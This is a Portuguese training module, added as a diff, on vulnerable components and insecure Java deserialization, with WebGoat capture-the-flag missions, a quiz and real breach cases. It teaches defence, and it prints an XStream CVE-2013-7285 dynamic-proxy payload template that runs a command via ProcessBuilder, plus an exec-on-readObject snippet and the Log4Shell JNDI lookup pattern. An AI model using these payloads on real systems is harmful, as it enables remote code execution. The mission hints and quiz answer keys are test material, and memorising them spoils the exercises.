@@ -1,0 +1,917 @@
+---
+slug: componentes-vulneraveis
+track: trilha-4
+title: "Componentes vulneráveis e desserialização"
+prerequisites: [web-por-dentro]
+lab: webgoat
+tasks:
+  - slug: missao-1-componente
+    title: "Missão 1 — Explorar um componente vulnerável (XStream)"
+    type: flag
+    prompt: "Depois de fazer o WebGoat aceitar o seu payload XML na lição Vulnerable Components (resposta com lessonCompleted igual a true), monte FLAG{cve-numero-classe}, tudo em minúsculas: 'cve-numero' é o identificador da vulnerabilidade que o campo \"feedback\" da resposta diz que você explorou (no formato cve-AAAA-NNNNN); 'classe' é o nome SIMPLES (sem pacote) da classe Java que aparece no campo \"output\" e que prova que o seu comando chegou a ser executado — a classe concreta que o ProcessBuilder devolveu e que não pôde ser convertida para String. Exemplo de formato: FLAG{cve-1999-0001-exemploclasse}."
+    hint: "O 'cve-numero' está no campo feedback da resposta de sucesso (algo como 'You successfully tried to exploit the CVE-...'). A 'classe' está no campo output: leia a mensagem de ClassCastException — ela nomeia a classe que o java.lang.ProcessBuilder.start() devolveu; use só o nome final, sem o pacote java.lang, em minúsculas."
+    flag:
+      hash: "scrypt$16384$8$1$b4247b15130051f536202f33625933def5f997b296ac532f4f5607ff50622f65"
+      salt: "127d752d825ccba3e7f981a5c61ba6a4"
+  - slug: missao-2-desserializacao
+    title: "Missão 2 — Executar código via desserialização insegura"
+    type: flag
+    prompt: "Depois de resolver a lição Insecure Deserialization do WebGoat (resposta com lessonCompleted igual a true), monte FLAG{assignment-uid}, tudo em minúsculas: 'assignment' é o valor do campo \"assignment\" que aparece na resposta JSON do POST /InsecureDeserialization/task; 'uid' é o número do serialVersionUID que o servidor exige no objeto serializado (o valor que faz a resposta parar de dizer que a versão não bate). Exemplo de formato: FLAG{algumassignment-7}."
+    hint: "Para 'assignment': leia o campo assignment do JSON (não está no texto da lição). Para 'uid': o servidor recusa com 'The serialization id does not match' quando o serialVersionUID está errado; descubra, por tentativa, qual número ele aceita — é um só, pequeno."
+    flag:
+      hash: "scrypt$16384$8$1$179685c03aeb9a3b9383594c61e02dc2a63c75c5ac738ed4f271ab8a23a7d318"
+      salt: "03f685d0292e15f2c523dab334feb49b"
+  - slug: quiz-final
+    title: "Quiz — Componentes vulneráveis e desserialização"
+    type: quiz
+    passPercent: 70
+    questions:
+      - question: "O que caracteriza a categoria 'Vulnerable and Outdated Components' (A06 do OWASP Top 10 2021)?"
+        options:
+          - "Um erro de lógica escrito pela própria equipe da aplicação, em código próprio"
+          - "Usar bibliotecas, frameworks ou outros componentes de terceiros com versões que têm vulnerabilidades conhecidas (e correção já disponível), direta ou transitivamente"
+          - "Um ataque de força bruta contra a senha de um componente"
+          - "A ausência de criptografia no banco de dados"
+        answer: 1
+        explanation: "A06 é sobre a SUA aplicação carregar componentes de terceiros desatualizados ou com CVE conhecida — inclusive dependências transitivas que você nunca declarou. A falha não está no seu código, mas a aplicação é quem roda o componente, então o risco é seu. As outras opções descrevem falhas de outras categorias (código próprio, autenticação, criptografia)."
+      - question: "Por que uma dependência transitiva é especialmente perigosa?"
+        options:
+          - "Porque ela é sempre maior que as diretas"
+          - "Porque você não a declarou nem a escolheu — ela entra porque uma dependência sua a usa —, então costuma passar despercebida, mas roda com todo o poder da aplicação"
+          - "Porque ela só funciona em produção, nunca em desenvolvimento"
+          - "Porque ela desativa as dependências diretas"
+        answer: 1
+        explanation: "A maior parte da árvore de dependências costuma ser transitiva: pacotes que entraram porque outro pacote os pediu. Você não os vê no seu arquivo de dependências, não acompanha as CVEs deles, mas eles executam no mesmo processo, com os mesmos privilégios. É por isso que o inventário (SBOM) e as ferramentas de SCA precisam varrer a árvore inteira, não só o que você declarou."
+      - question: "Qual é a diferença entre uma vulnerabilidade zero-day e uma n-day?"
+        options:
+          - "Zero-day é mais antiga; n-day é mais nova"
+          - "São sinônimos"
+          - "No zero-day não há correção pública ainda (o defensor está às cegas); na n-day já existe correção, mas o sistema não foi atualizado — o atacante só precisa achar quem não corrigiu"
+          - "Zero-day só afeta Windows; n-day só afeta Linux"
+        answer: 2
+        explanation: "O zero-day é a falha que ninguém ainda corrigiu publicamente. A n-day (ou one-day) já tem patch disponível — o conhecimento é público —, e a exploração vive de sistemas que não aplicaram a correção. A maioria dos incidentes por componente vulnerável, como a Equifax, é n-day: a correção existia havia meses."
+      - question: "Por que desserializar dados nativos (Java readObject, PHP unserialize, Python pickle) vindos do atacante pode executar código, enquanto ler um JSON para um tipo fixo normalmente não?"
+        options:
+          - "Porque o JSON é criptografado e os bytes nativos não"
+          - "Porque a desserialização nativa recria o TIPO que os bytes mandarem e chama métodos do objeto durante a reconstrução; o parser de JSON só preenche campos de um tipo que VOCÊ fixou, sem instanciar tipos à escolha do atacante nem chamar métodos"
+          - "Porque o JSON não aceita números grandes"
+          - "Porque a desserialização nativa é mais rápida"
+        answer: 1
+        explanation: "O perigo não é 'ler dados', é deixar os bytes decidirem qual objeto construir e disparar métodos durante a construção. A desserialização nativa reconstrói qualquer tipo indicado no fluxo e chama ganchos (readObject interno, __wakeup/__destruct, comparadores) — a brecha para uma gadget chain. Um parser de JSON mapeado para um tipo fixo só preenche campos conhecidos; não instancia classes à escolha do atacante nem executa métodos."
+      - question: "O que é uma gadget chain na exploração de desserialização?"
+        options:
+          - "Um dispositivo físico ligado ao servidor"
+          - "Um código novo que o atacante injeta e o servidor compila"
+          - "Uma sequência de classes JÁ presentes na aplicação ou em suas bibliotecas cujos métodos, chamados em cascata durante a desserialização, terminam numa ação perigosa (como rodar um comando)"
+          - "A lista de portas abertas no servidor"
+        answer: 2
+        explanation: "O atacante quase nunca injeta código novo na desserialização: ele encadeia 'engenhocas' (gadgets) que já existem no classpath — métodos de classes comuns que, combinados, levam de um readObject a um Runtime.exec. É por isso que a mera presença de certas bibliotecas (ou a falta de uma allowlist de classes) já basta para a falha; e por isso bloquear 'o payload conhecido' não resolve."
+      - question: "Na lição do lab, o XStream reconstruía um objeto a partir de XML. Qual foi o mecanismo que levou à execução de código (CVE-2013-7285)?"
+        options:
+          - "O XStream executou diretamente uma tag <script> no XML"
+          - "O XML descreveu um dynamic proxy da interface esperada, com um java.beans.EventHandler que chamava ProcessBuilder.start(); ao usar o objeto reconstruído, o método do proxy disparou o comando"
+          - "O XStream enviou o XML para um servidor externo que devolveu o comando"
+          - "O XML continha a senha do servidor em claro"
+        answer: 1
+        explanation: "O payload descrevia um dynamic proxy que implementava a interface Contact; o handler era um EventHandler apontando para um ProcessBuilder com a ação 'start'. Quando a aplicação chamou um método do objeto reconstruído, o EventHandler invocou ProcessBuilder.start() — e o comando rodou. A prova no lab foi a exceção de cast de ProcessImpl para String no campo output: o processo chegou a ser criado. Não há <script>, nem rede externa, nem senha."
+      - question: "Qual conjunto de defesas ataca a RAIZ dos problemas deste módulo?"
+        options:
+          - "Esconder a versão das bibliotecas no cabeçalho HTTP e confiar que ninguém vai descobrir"
+          - "Manter um inventário (SBOM) e rodar SCA para atualizar componentes com CVE; e, na desserialização, não desserializar dados não confiáveis — preferir formatos de dados puros (JSON) e, se for inevitável, uma allowlist de classes"
+          - "Rodar a aplicação como root para ela poder se defender melhor"
+          - "Aumentar o tamanho da chave de criptografia do banco"
+        answer: 1
+        explanation: "Componente vulnerável se trata com visibilidade e atualização: saber o que você usa (SBOM), cruzar com CVEs (SCA) e aplicar patches. Desserialização se trata na arquitetura: não reconstruir objetos a partir de bytes não confiáveis; usar formatos de dados puros; e, quando a serialização nativa for inevitável, restringir por allowlist de classes (ObjectInputFilter no Java). Esconder versão é security through obscurity; root e tamanho de chave não têm relação com a causa."
+glossary:
+  - term: serialization
+    definition: "Serialização: transformar um objeto que está na memória (com seu tipo e seus campos) numa sequência de bytes ou texto, para salvar em disco, guardar numa sessão ou enviar pela rede. O caminho inverso é a desserialização."
+  - term: deserialization
+    definition: "Desserialização: reconstruir, a partir de bytes ou texto, o objeto que existia na memória. Quando a entrada vem de fonte não confiável e o formato é nativo (Java, PHP, Python pickle), reconstruir pode executar código — a insecure deserialization."
+  - term: insecure deserialization
+    definition: "Insecure deserialization (desserialização insegura): falha em que a aplicação desserializa dados controlados pelo atacante com um mecanismo que recria tipos arbitrários e chama métodos durante a reconstrução, indo de adulteração de dados até execução remota de código. É a CWE-502."
+  - term: gadget chain
+    definition: "Gadget chain (corrente de engenhocas): sequência de classes já presentes na aplicação ou em suas bibliotecas cujos métodos, chamados em cascata durante a desserialização, terminam numa ação perigosa (como rodar um comando). O atacante não injeta código novo: encadeia o que já existe no classpath."
+  - term: software bill of materials
+    definition: "Software Bill of Materials (SBOM, lista de materiais do software): inventário legível por máquina de todos os componentes e versões que entram num software, inclusive as dependências transitivas. É a base para saber se você usa algo com vulnerabilidade conhecida."
+  - term: software composition analysis
+    definition: "Software Composition Analysis (SCA, análise de composição de software): ferramentas que leem as dependências de um projeto e as cruzam com bancos de vulnerabilidades, apontando quais componentes têm CVE. Exemplos: OWASP Dependency-Check, npm audit, pip-audit."
+  - term: transitive dependency
+    definition: "Dependência transitiva: a que você não declarou, mas que entra no projeto porque uma de suas dependências diretas a usa. A maior parte da árvore costuma ser transitiva — e é onde passam despercebidas vulnerabilidades que mesmo assim rodam com todo o poder da aplicação."
+  - term: n-day vulnerability
+    definition: "N-day (ou one-day): vulnerabilidade já conhecida publicamente e com correção disponível, mas ainda não aplicada em muitos sistemas. O oposto do zero-day: o atacante não precisa descobrir nada, só encontrar quem não atualizou."
+  - term: JNDI
+    definition: "Java Naming and Directory Interface (JNDI): API do Java para buscar objetos e recursos por nome em serviços de diretório (LDAP, DNS, RMI). Quando um lookup JNDI aceita um endereço controlado pelo atacante, ele pode carregar e instanciar código remoto — o mecanismo central do Log4Shell."
+  - term: POP chain
+    definition: "Property-Oriented Programming (POP) chain: o nome, no mundo PHP, da gadget chain da desserialização — a cadeia de métodos mágicos (como __wakeup e __destruct) que o unserialize dispara e que o atacante encadeia até uma ação perigosa."
+---
+
+import arvoreDeDependencias from "./img/arvore-de-dependencias.svg";
+import fluxoDesserializacao from "./img/fluxo-desserializacao.svg";
+
+## 1. Abertura — o que você vai aprender e por quê
+
+Em 2017, a Equifax — uma das três grandes agências de crédito dos Estados Unidos
+— perdeu os dados de cerca de **147 milhões** de pessoas. A porta de entrada não
+foi um gênio do mal escrevendo um exploit inédito. Foi uma biblioteca
+desatualizada: o **Apache Struts**, com uma falha pública (`CVE-2017-5638`) cuja
+correção estava disponível havia **mais de dois meses**. Ninguém atualizou. Do
+outro lado, um atacante que só precisou procurar quem não tinha corrigido.
+
+Este módulo é sobre essas duas famílias de falha, que costumam andar juntas:
+
+- **Componentes vulneráveis** (categoria **A06:2021 — Vulnerable and Outdated
+  Components** do OWASP Top 10): a sua aplicação carrega bibliotecas, frameworks
+  e pacotes de terceiros, e **a falha de qualquer um deles vira falha sua**.
+  Quase nenhum software hoje é escrito só com código próprio; a maior parte são
+  linhas de terceiros, em camadas, muitas das quais você nem sabe que estão lá.
+- **Desserialização insegura** (<GlossaryTerm term="insecure deserialization">insecure
+  deserialization</GlossaryTerm>, hoje dentro de **A08:2021 — Software and Data
+  Integrity Failures**): quando a aplicação reconstrói um objeto a partir de
+  bytes que o atacante controla, essa reconstrução pode **executar código**. É
+  uma das formas mais diretas de sair de "mandei uns dados" para "rodei um
+  comando no servidor".
+
+As duas se encontram no mesmo ponto: um **componente** que faz
+<GlossaryTerm term="deserialization">desserialização</GlossaryTerm> insegura é o
+pior dos dois mundos — e é exatamente o que você vai explorar no laboratório,
+com o **XStream** (uma biblioteca Java de (de)serialização de XML) e com a
+serialização nativa do Java.
+
+**Ao final, você vai saber:**
+
+- explicar por que um componente de terceiros desatualizado é uma falha da sua
+  aplicação, e como uma <GlossaryTerm term="transitive dependency">dependência
+  transitiva</GlossaryTerm> que você nunca declarou entra no seu software;
+- distinguir uma vulnerabilidade <GlossaryTerm term="n-day vulnerability">n-day</GlossaryTerm>
+  (correção disponível, não aplicada) de um zero-day, e por que a maioria dos
+  incidentes é n-day;
+- explicar, por dentro, por que
+  <GlossaryTerm term="deserialization">desserializar</GlossaryTerm> dados nativos
+  não confiáveis executa código, e o que é uma
+  <GlossaryTerm term="gadget chain">gadget chain</GlossaryTerm>;
+- explorar, no WebGoat, um componente vulnerável (XStream, `CVE-2013-7285`) e a
+  desserialização nativa do Java, fazendo o servidor executar um comando;
+- defender de verdade: inventário (<GlossaryTerm term="software bill of materials">SBOM</GlossaryTerm>),
+  <GlossaryTerm term="software composition analysis">SCA</GlossaryTerm> e patching
+  contra componentes vulneráveis; e, contra desserialização, não desserializar o
+  que não é confiável, preferir formatos de dados puros e usar allowlist de classes.
+
+**Pré-requisitos:** 4.1 — Como a web funciona por dentro (de lá você traz a ideia
+de que um dado do usuário cruza uma <GlossaryTerm term="trust boundary">trust
+boundary</GlossaryTerm> e pode ser tratado como algo mais poderoso do que
+deveria; aqui o "dado" será um objeto serializado).
+
+**Tempo estimado:** de 4 a 6 horas, incluindo o laboratório.
+
+<Callout variant="ethics">
+Tudo aqui se faz **só** no laboratório local (o WebGoat, vulnerável de propósito e
+sem acesso à internet) ou em um alvo com **autorização por escrito**. Explorar um
+componente vulnerável em sistema alheio, ou forjar um objeto que executa comandos
+num servidor de terceiros, é invasão — crime no Brasil (art. 154-A do Código Penal,
+visto na Trilha 1). Os payloads deste módulo existem apenas dentro do lab isolado.
+</Callout>
+
+## 2. Teoria aprofundada — o conceito por dentro
+
+### 2.1 Você não escreve a maior parte do seu software
+
+Abra qualquer aplicação moderna e olhe de quantas linhas ela é feita. Uma fração
+é código seu; o resto são **componentes** de terceiros: o framework web, o driver
+do banco, a biblioteca que gera PDF, a que faz parsing de XML, a que valida
+e-mails. Você declara algumas delas (as **dependências diretas**), e cada uma
+puxa as suas — as <GlossaryTerm term="transitive dependency">dependências
+transitivas</GlossaryTerm>. O resultado é uma **árvore**, e você vê só a copa.
+
+<Figure
+  src={arvoreDeDependencias}
+  alt="Uma árvore de dependências em três níveis. No topo, a sua aplicação. Dela descem duas dependências diretas que você declarou: uma biblioteca de relatórios 3.2 e um http-client 2.0. A biblioteca de relatórios puxa sozinha duas dependências transitivas que você nunca escolheu: um datas-util 5.1 e um parser-xml 1.4. O parser-xml 1.4 está em vermelho, marcado com CVE conhecida e RCE, com o aviso de que você nunca o declarou mas ele roda com todo o poder da aplicação. O rodapé lembra que poucas linhas são suas e a maioria é de terceiros, e que a falha de qualquer peça é a sua falha."
+  caption="Você declara a ponta da árvore; o volume está nas dependências transitivas. Uma CVE em qualquer nó roda no seu processo, com os seus privilégios."
+/>
+
+É aqui que nasce a categoria **A06:2021 — Vulnerable and Outdated Components**
+(antiga "Using Components with Known Vulnerabilities", A09 no Top 10 de 2017). A
+ideia é incômoda: a falha **não está no seu código**. Está numa peça que você
+importou — às vezes uma que você nem sabia que tinha. Mas quem roda essa peça é a
+sua aplicação, no seu servidor, com os seus privilégios. Para o atacante, é
+indiferente de quem é a culpa; o que importa é que o seu processo executa um
+código furado.
+
+Repare na natureza do ataque. Não é preciso descobrir nada novo: a falha é
+**pública**, tem um <GlossaryTerm term="CVE">CVE</GlossaryTerm> (*Common
+Vulnerabilities and Exposures*, o identificador padrão de uma vulnerabilidade
+conhecida, visto na Trilha 2), uma nota <GlossaryTerm term="CVSS">CVSS</GlossaryTerm>
+e, quase sempre, uma correção já lançada. O atacante faz o caminho mais barato do
+mundo: pega a lista de CVEs recentes, descobre a versão que o seu site anuncia (um
+cabeçalho `Server:`, um `/VERSION`, um JavaScript com o número da versão) e testa.
+A isso se chama <GlossaryTerm term="n-day vulnerability">n-day</GlossaryTerm>
+(ou *one-day*): a falha já é conhecida, só falta você não ter atualizado. É o
+oposto do *zero-day* (falha sem correção pública). A imensa maioria das invasões
+por componente é n-day — inclusive a Equifax (seção 4).
+
+### 2.2 Serializar e desserializar: o que é e por que existe
+
+Agora a segunda metade do módulo. Programas precisam, o tempo todo, **guardar** um
+objeto ou **mandá-lo** para outro lugar: salvar a sessão do usuário, pôr um item
+numa fila, enviar um objeto entre dois serviços. Mas um objeto vive na memória —
+é um amontoado de campos e referências num endereço que só faz sentido naquele
+processo. Para guardá-lo ou transmiti-lo, é preciso achatá-lo numa sequência de
+bytes ou texto. Isso é a <GlossaryTerm term="serialization">serialization</GlossaryTerm>
+(serialização). O caminho de volta — pegar os bytes e **reconstruir** o objeto na
+memória — é a <GlossaryTerm term="deserialization">deserialization</GlossaryTerm>
+(desserialização).
+
+Até aqui, nada de perigoso. O perigo aparece quando os bytes a desserializar vêm
+de **fora** (do navegador, da rede, de um arquivo enviado) e o mecanismo usado é a
+**serialização nativa** da linguagem: o `ObjectInputStream.readObject()` do Java,
+o `unserialize()` do PHP, o `pickle.loads()` do Python. Esses mecanismos não fazem
+só "preencher um formulário de campos". Eles:
+
+1. **recriam o tipo que os bytes mandarem** — o fluxo serializado diz "eu sou um
+   objeto da classe `X`", e o desserializador instancia `X`, seja `X` o que for,
+   desde que esteja no classpath;
+2. **chamam métodos do objeto durante a reconstrução** — ganchos como o
+   `readObject` privado de uma classe Java, o `__wakeup()`/`__destruct()` do PHP,
+   ou comparadores chamados ao inserir o objeto numa coleção ordenada.
+
+Juntando as duas, o atacante ganha um superpoder: ele escolhe **qual objeto** o
+servidor vai construir e **dispara métodos** no meio do caminho. Se existir, em
+qualquer canto do classpath, uma sequência de classes cujos métodos, encadeados,
+levem a uma ação perigosa (rodar um comando, abrir um arquivo, fazer uma conexão),
+o atacante monta um fluxo que passa por elas. Essa sequência é a
+<GlossaryTerm term="gadget chain">gadget chain</GlossaryTerm> — e repare: o
+atacante **não injeta código novo**; ele encadeia o que **já está lá**. No mundo
+PHP, o mesmo conceito se chama <GlossaryTerm term="POP chain">POP chain</GlossaryTerm>.
+
+<Figure
+  src={fluxoDesserializacao}
+  alt="Duas trilhas paralelas a partir dos bytes do atacante. Na trilha perigosa, de cima, os bytes entram numa função de desserialização nativa (readObject/unserialize), que reconstrói o objeto recriando o tipo que os bytes mandarem e, durante a reconstrução, chama métodos do objeto; se houver uma gadget chain, isso termina num Runtime.exec e em execução remota de código. Na trilha segura, de baixo, os mesmos bytes num formato de dados puro (JSON) são lidos para um tipo fixo; o parser só preenche campos conhecidos, não instancia tipos à escolha do atacante nem chama métodos, então não há execução. O rodapé resume que o perigo não é ler dados, mas deixar os bytes decidirem qual objeto construir e disparar código durante a construção."
+  caption="A diferença que importa: desserialização nativa deixa os bytes escolherem o tipo e dispara métodos ao reconstruir; ler dados puros (JSON) só preenche campos de um tipo que você fixou."
+/>
+
+É por isso que **ler um JSON costuma ser seguro e desserializar um objeto Java
+não**. Um parser de JSON mapeado para um tipo que **você** fixou de antemão só
+copia valores para campos conhecidos: ele não instancia classes à escolha do
+atacante nem chama métodos de ciclo de vida. (JSON também tem seus abusos — ver a
+seção 6 —, mas a diferença de fundo é essa.) A falha, como em toda injeção da
+Trilha 4, é confiar na entrada para decidir o que **construir** e **executar**.
+Esta é a <GlossaryTerm term="CWE">CWE</GlossaryTerm>-502, *Deserialization of
+Untrusted Data*.
+
+### 2.3 Quando as duas falhas se encontram
+
+O caso mais perigoso é um **componente** cuja função é justamente desserializar.
+Foi o do **XStream**: uma biblioteca Java popular para converter objetos em XML e
+de volta. A versão do lab tem a `CVE-2013-7285` — um XML malicioso faz o XStream
+reconstruir não um objeto inocente, mas um *dynamic proxy* ligado a um
+`ProcessBuilder`, e, ao ser usado, esse objeto executa um comando. Ou seja: você
+atacou a aplicação sem tocar no código dela, só por causa de uma **biblioteca
+desatualizada** que **desserializa de forma insegura**. A06 e A08 na mesma falha.
+É o que você vai fazer na Missão 1 do laboratório.
+
+## 3. Como o ataque funciona — a mecânica
+
+### 3.1 Descobrir o componente e a versão
+
+O primeiro passo de um ataque por componente é **saber qual componente e qual
+versão** o alvo usa. As pistas estão à vista:
+
+```http
+GET / HTTP/1.1
+Host: alvo.exemplo
+
+HTTP/1.1 200 OK
+Server: Apache/2.4.49 (Unix)
+X-Powered-By: PHP/7.4.3
+X-Generator: Drupal 9 (https://www.drupal.org)
+```
+
+Cada linha dessas é um nome de componente com versão. A partir daí, o atacante
+cruza com um banco de CVEs (a *National Vulnerability Database*, o site do próprio
+projeto, ferramentas como o `searchsploit`): existe uma `CVE` conhecida para o
+`Apache/2.4.49`? (Existe — a `CVE-2021-41773`, que você verá na Trilha 5.) Para o
+`PHP/7.4.3`? E assim por diante. Quando o site não anuncia a versão de bandeja, o
+atacante compara *fingerprints* (caminhos, mensagens de erro, hashes de arquivos
+estáticos) para adivinhar a versão — mas, na prática, uma espantosa quantidade de
+sistemas ainda a entrega escrita.
+
+O ataque não precisa de engenhosidade: a inteligência já está no **CVE** e muitas
+vezes num *proof of concept* público. O trabalho do atacante é casar versão com
+CVE e disparar. Por isso "esconder a versão" é, no máximo, um atrito — não uma
+defesa (seção 8).
+
+### 3.2 A mecânica da desserialização insegura (Java)
+
+Veja um trecho de serialização nativa Java, do jeito que aparece em muitos
+sistemas (guardar um objeto numa sessão, num cookie, numa fila):
+
+```java
+// Lado que recebe dados de fora e reconstrói o objeto:
+ObjectInputStream ois = new ObjectInputStream(entradaDoUsuario);
+Tarefa t = (Tarefa) ois.readObject();   // <-- aqui o perigo
+```
+
+O `readObject()` lê o fluxo, descobre que classe reconstruir e a reconstrói. Se a
+classe tiver um método **`readObject` privado** (um gancho que o Java chama
+automaticamente ao desserializar), esse código roda **durante** a reconstrução —
+antes mesmo do `(Tarefa)` cast da linha acima. É exatamente o gancho que a classe
+`VulnerableTaskHolder` do WebGoat tem, e que você vai disparar na Missão 2:
+
+```java
+private void readObject(ObjectInputStream stream) throws Exception {
+  stream.defaultReadObject();
+  // ... validações ...
+  if ((taskAction.startsWith("sleep") || taskAction.startsWith("ping"))
+      && taskAction.length() < 22) {
+    Process p = Runtime.getRuntime().exec(taskAction);   // executa um comando do SO
+  }
+}
+```
+
+Quem controla os bytes controla o campo `taskAction`. Como o `readObject` roda ao
+desserializar, mandar um objeto com `taskAction = "sleep 5"` faz o servidor
+**executar** `sleep 5`. Num gadget real, `taskAction` seria um comando útil ao
+atacante; aqui, uma trava didática só deixa `sleep`/`ping` (para você não destruir
+o lab), mas o mecanismo é idêntico ao de um RCE de verdade.
+
+Um detalhe fundamental: para forjar o objeto você **não precisa do código-fonte
+nem do arquivo `.class`** da `VulnerableTaskHolder`. Basta produzir os **bytes** no
+formato de serialização do Java — um formato documentado, que começa sempre com os
+mesmos quatro bytes mágicos (`AC ED 00 05`), lista o nome da classe, o
+`serialVersionUID` (um número que identifica a versão da classe), os campos e os
+valores. No laboratório você vai montar esses bytes **à mão, com Python** — o que
+deixa claro que a serialização é só um formato de dados, e que a confiança nela é
+que está errada.
+
+### 3.3 A mecânica do XStream (CVE-2013-7285)
+
+O XStream converte XML em objetos. O problema: no XML, o atacante pode descrever
+**que tipo** reconstruir. A `CVE-2013-7285` usa isso para pedir um *dynamic proxy*
+— um objeto que implementa uma interface e, a cada método chamado, delega a um
+"handler". Se o handler for um `java.beans.EventHandler` apontando para um
+`ProcessBuilder`, então **usar** o objeto reconstruído (chamar qualquer método
+dele) dispara `ProcessBuilder.start()` — ou seja, roda um comando. O XML tem esta
+forma (compacto, sem espaços supérfluos, porque a lição filtra alguns):
+
+```text
+<dynamic-proxy>
+  <interface>PACOTE.DA.INTERFACE.ESPERADA</interface>
+  <handler class="java.beans.EventHandler">
+    <target class="java.lang.ProcessBuilder">
+      <command><string>COMANDO</string></command>
+    </target>
+    <action>start</action>
+  </handler>
+</dynamic-proxy>
+```
+
+Nenhuma tag `<script>`, nenhuma rede externa: só a descrição de um objeto que, ao
+ser usado, executa um comando. É a mesma lógica da serialização nativa — o formato
+muda (XML em vez de bytes), o pecado é o mesmo: reconstruir um tipo à escolha de
+quem mandou os dados.
+
+## 4. Casos reais — o que aconteceu no mundo
+
+Três casos verificados em fonte primária, cobrindo componente vulnerável e
+desserialização.
+
+### Equifax: um componente não corrigido que vazou ~147 milhões de pessoas (2017)
+
+Em **7 de setembro de 2017**, a Equifax anunciou publicamente que um incidente
+expunha dados de aproximadamente **143 milhões** de consumidores dos EUA (número
+depois revisado para cerca de **147 milhões** no acordo com a FTC). Pela própria
+Equifax (comunicado arquivado como 8-K na SEC), o acesso não autorizado ocorreu
+**de meados de maio até julho de 2017**, e a empresa só o **descobriu em 29 de
+julho de 2017**.
+
+A porta foi um **componente vulnerável**: o framework **Apache Struts**, com a
+`CVE-2017-5638` — uma execução remota de código no *Jakarta Multipart parser*,
+disparada por um cabeçalho `Content-Type` malicioso. A Apache publicou o aviso
+(S2-045) e a correção em **6 de março de 2017**; segundo a FTC, a Equifax "falhou
+em corrigir sua rede depois de ser alertada em março de 2017" — ou seja, a
+correção existia havia cerca de **dois meses** quando a invasão começou. É um
+<GlossaryTerm term="n-day vulnerability">n-day</GlossaryTerm> clássico.
+
+- **Impacto:** segundo o relatório do **GAO** (US Government Accountability
+  Office, GAO-18-559), os atacantes tiveram acesso por cerca de **76 dias**,
+  rodaram mais de **9.000 consultas** e alcançaram **51 bancos de dados** — em
+  parte porque encontraram, dentro da rede, um arquivo de texto com usuários e
+  senhas de outros bancos (o GAO fala em "ao menos **145,5 milhões** de
+  indivíduos"). Em **julho de 2019**, a Equifax fechou acordo com a FTC, o CFPB e
+  estados no valor de **até US$ 700 milhões**.
+- **Lição:** manter um componente desatualizado com CVE pública e correção
+  disponível é um dos riscos mais baratos de explorar e mais fáceis de evitar. As
+  defesas que teriam cortado isto são as da seção 8: inventário, varredura de
+  dependências e **aplicar o patch** — somadas à segmentação de rede e ao mínimo
+  privilégio, que teriam contido o movimento lateral.
+- **Fontes:** [Equifax — comunicado 8-K na SEC, 07/09/2017](https://www.sec.gov/Archives/edgar/data/0000033185/000003318517000026/exhibit99120170907.htm),
+  [FTC — "Equifax to Pay $575 Million..." (22/07/2019)](https://www.ftc.gov/news-events/news/press-releases/2019/07/equifax-pay-575-million-part-settlement-ftc-cfpb-states-related-2017-data-breach)
+  e [GAO-18-559 — "Actions Taken by Equifax and Federal Agencies..."](https://www.gao.gov/products/gao-18-559).
+
+### Log4Shell: uma dependência que virou o pesadelo da internet (2021)
+
+Em **dezembro de 2021**, o mundo descobriu a `CVE-2021-44228`, apelidada de
+**Log4Shell**: uma execução remota de código no **Apache Log4j 2**, a biblioteca
+de *logging* mais usada do ecossistema Java. O mecanismo: o Log4j interpretava, nas
+mensagens que registrava, uma sintaxe de *lookup* `${jndi:ldap://...}`; ao registrar
+uma mensagem controlada pelo atacante, a biblioteca fazia um lookup
+<GlossaryTerm term="JNDI">JNDI</GlossaryTerm> para um servidor LDAP do atacante e
+**carregava e instanciava código remoto**. Bastava que um valor controlado (um
+cabeçalho `User-Agent`, um nome de usuário, um campo de chat) fosse registrado em
+log.
+
+- **Impacto:** nota <GlossaryTerm term="CVSS">CVSS</GlossaryTerm> **10.0** (o
+  máximo). Afetava o `log4j-core` da versão **2.0-beta9** até antes da **2.15.0**;
+  a correção veio na **2.15.0** (e, por tabela, 2.12.2 e 2.3.1), seguida de 2.16 e
+  2.17 para falhas correlatas. A gravidade real veio do fato de o Log4j ser quase
+  sempre uma <GlossaryTerm term="transitive dependency">dependência transitiva</GlossaryTerm>:
+  milhões de aplicações o continham **sem saber**, enterrado três ou quatro níveis
+  dentro da árvore. Foi a prova viva de por que um SBOM importa — muita gente
+  passou dias só tentando responder "eu uso Log4j?".
+- **Lição:** o perigo não mora só nas dependências que você escolhe, mas nas que
+  elas arrastam. Sem inventário, você não consegue nem **procurar** a falha.
+- **Fonte:** [Apache Logging Services — Log4j Security (CVE-2021-44228)](https://logging.apache.org/log4j/2.x/security.html).
+
+### XStream CVE-2013-7285: o componente do seu laboratório
+
+A falha que você vai explorar na Missão 1 é real e documentada pelo próprio
+projeto XStream. Nas palavras da equipe, "XStream can be used for Remote Code
+Execution" — um fluxo de entrada manipulado permite "run arbitrary shell commands
+only by manipulating the processed input stream", explorando o tratamento de
+*dynamic proxy* e da classe `EventHandler`. Afetava **todas as versões até a
+1.4.6** (e a 1.4.10, se o framework de segurança não fosse inicializado).
+
+- **Impacto:** execução remota de código em qualquer aplicação que
+  desserializasse XML não confiável com uma versão vulnerável do XStream. A
+  correção foi endurecer a biblioteca (um *framework* de segurança com
+  <GlossaryTerm term="allowlist">allowlist</GlossaryTerm> de tipos) e, claro,
+  atualizar.
+- **Lição:** uma biblioteca de (de)serialização é um componente de altíssimo
+  risco — ela existe para reconstruir objetos, que é a operação perigosa. Tratá-la
+  com desserialização de dados não confiáveis é combinar as duas falhas do módulo.
+- **Fonte:** [XStream — CVE-2013-7285](https://x-stream.github.io/CVE-2013-7285.html).
+
+## 5. Mãos à obra — o laboratório guiado
+
+**Objetivo:** ao terminar, você terá (1) explorado um **componente vulnerável** (o
+XStream, `CVE-2013-7285`) fazendo o servidor executar um comando ao desserializar
+um XML, e (2) explorado a **desserialização nativa** do Java, forjando à mão um
+objeto serializado que roda um comando no servidor. Cada missão rende uma flag.
+
+O laboratório é o **`webgoat`**: o Kali e o **OWASP WebGoat**, a aplicação de
+treino da OWASP com lições guiadas de falhas web em Java. De dentro do Kali, o
+alvo responde em `http://webgoat:8080/WebGoat/`. Vamos trabalhar pelo terminal,
+com `curl` e `python3` — porque estas falhas se enxergam melhor no payload cru.
+(A versão usada ao escrever este módulo foi a **WebGoat 2026.4**, com **OpenJDK 25**
+no Kali.)
+
+<Callout variant="warning" title="Um laboratório por vez">
+Este lab sobe o Kali e o WebGoat. Se outro lab estiver no ar, o botão vira **Trocar
+para este lab**. O WebGoat guarda o progresso num banco **em memória**: ao resetar
+o lab, as suas contas e o avanço das lições somem — ótimo para refazer do zero.
+</Callout>
+
